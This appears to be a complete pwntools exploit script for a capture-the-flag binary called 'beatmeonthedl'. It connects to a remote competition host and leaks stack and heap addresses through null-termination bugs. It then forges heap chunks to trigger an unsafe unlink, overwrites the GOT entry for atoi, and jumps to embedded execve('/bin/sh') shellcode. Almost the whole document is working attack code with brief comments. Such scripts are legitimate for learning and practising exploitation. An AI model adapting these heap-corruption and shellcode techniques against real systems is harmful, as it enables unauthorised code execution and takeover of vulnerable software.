from pwn import *

#r = process('./beatmeonthedl')
r = remote('beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me', 6969)

shellcode = "\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

raw_input()

# leak stack address -null termination bug in username-
l = r.recvuntil("Enter username: ")
print l

r.sendline("aaaaaaaaaaaaaaaa")

l = r.recvuntil("Enter username: ")
stack_addr = u64(l.split("\n")[0].split("aaaaaaaaaaaaaaaa")[1].ljust(8,"\x00"))

log.info("[+] stack_addr = " + hex(stack_addr))

# leak heap address -null termination bug in password-
l = r.recvuntil("Enter username: ")
print l
r.sendline("mcfly")
l = r.recvuntil("Enter Pass: ")
print l
r.sendline("aaaaaaaaaaaaaaaaaaaaaaaa")
l = r.recvuntil("Enter username: ")
heap_addr = u64(l.split("\n")[0].split("aaaaaaaaaaaaaaaaaaaaaaaa")[1].ljust(8,"\x00")) -0x10
log.info("[+] heap_addr = " + hex(heap_addr))

# login
r.sendline("mcfly")
l = r.recvuntil("Enter Pass: ")

r.sendline("awesnap")

l = r.recvuntil("| ")
print l

def add_req(data):
    log.info("add_req : " + data)
    r.sendline("1")
    l = r.recvuntil("Request text > ")
    print l
    r.sendline(data)
    l = r.recvuntil("| ")
    print l

def print_req():
    log.info("print_req : ")
    r.sendline("2")
    l = r.recvuntil("| ")
    print l

def delete_req(index):
    log.info("delete_req : " + index)
    r.sendline("3")
    l = r.recvuntil("choice: ")
    print l
    r.sendline(index)
    l = r.recvuntil("| ")
    print l

def update_req(index, data):
    log.info("update_req : " +index+":"+ data)
    r.sendline("4")
    l = r.recvuntil("choice: ")
    print l
    r.sendline(index)
    l = r.recvuntil("data: ")
    print l
    r.sendline(data)
    l = r.recvuntil("| ")
    print l

def exit():
    log.info("exit : ")
    r.sendline("5")
    l = r.recvall()
    print l


# add request 5-times for Unsafe Unlink attack (House of Einherjar)
add_req("aaaaaaaaaa")
add_req("bbbbbbbbbb")
add_req("bbbbbbbbbb")
add_req("bbbbbbbbbb")
add_req("bbbbbbbbbb")

addr_atoi = 0x00000000006099D8

# Make fake chunk and fd->reqlist[4]
update_req("4","b"*(48+16)+p64(0x0)+p64(0xe41)+p64(0x609e90-0x18)+p64(0x609e90-0x10))
# Make fake used chunk for causing unlink
update_req("3","b"*48+p64(0x0)+p64(0x53)+"\x00"*48)

# Cause unlink and reqlist[2] is overwritten to the address(0x609e90-0x18)
delete_req("4")

# before overwritten got, prepare shellcode in heap.
update_req("3",shellcode)

# Overwrite reqlist[0] to got_atoi address
update_req("2","A"*8+p64(addr_atoi))

# got_atoi address is overwritten to shellcode address.
update_req("0",p64(heap_addr+0x110))
